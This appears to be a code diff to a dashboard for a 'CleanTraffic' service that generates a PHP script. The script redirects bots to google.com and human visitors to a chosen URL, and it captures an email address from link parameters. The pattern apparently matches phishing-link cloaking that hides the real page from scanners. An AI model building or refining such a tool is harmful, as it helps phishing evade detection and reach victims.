@@ -394,7 +394,7 @@ export default function UserDashboard() {
                     <li>Download the PHP script package (ZIP file)</li>
                     <li>Extract and upload index.php to your website</li>
                     <li>Visitors are classified and redirected immediately (no loading screen)</li>
-                    <li>Features: email capture (?, #, $), browser detection, security headers</li>
+                    <li>Features: email capture (?e= or ?email=), browser detection, security headers</li>
                     <li>Humans go to: {redirectUrls?.humanUrl || "Default: https://example.com/human"}</li>
                     <li>Bots go to: {redirectUrls?.botUrl || "Default: https://google.com"}</li>
                   </ul>
@@ -416,7 +416,7 @@ export default function UserDashboard() {
  * Features:
  * - Immediate classification and redirect (no loading screen)
  * - Server-side browser/device detection from user agent
- * - Email capture from URL parameters (?, #, $)
+ * - Email capture from URL query parameters (?e= or ?email=)
  * - Security headers (HSTS, CSP, X-Frame-Options)
  * - Query string forwarding to redirect URLs
  * - Redirect URLs configured in your CleanTraffic dashboard
@@ -436,31 +436,13 @@ header('Content-Security-Policy: default-src \\'self\\'; script-src \\'self\\' \
 
 // ============ EXTRACT EMAIL FROM URL ============
 function extractEmail() {
-    // Support multiple tag formats: ?, #, $
-    $url = $_SERVER['REQUEST_URI'] ?? '';
+    // Extract email from query string (?e= or ?email=)
     $email = null;
     
-    // Parse query string (?) for email
     if (isset($_GET['e'])) {
         $email = $_GET['e'];
     } elseif (isset($_GET['email'])) {
         $email = $_GET['email'];
-    }
-    
-    // Parse hash fragment (#) - extract from full URL if present
-    if (!$email && strpos($url, '#') !== false) {
-        $hashPart = substr($url, strpos($url, '#') + 1);
-        parse_str($hashPart, $hashParams);
-        $email = $hashParams['e'] ?? $hashParams['email'] ?? null;
-    }
-    
-    // Parse custom tag ($) - extract from URL
-    if (!$email && strpos($url, '$e=') !== false) {
-        preg_match('/\\$e=([^&\\s#]+)/', $url, $matches);
-        $email = $matches[1] ?? null;
-    } elseif (!$email && strpos($url, '$email=') !== false) {
-        preg_match('/\\$email=([^&\\s#]+)/', $url, $matches);
-        $email = $matches[1] ?? null;
     }
     
     return $email ? filter_var($email, FILTER_SANITIZE_EMAIL) : null;
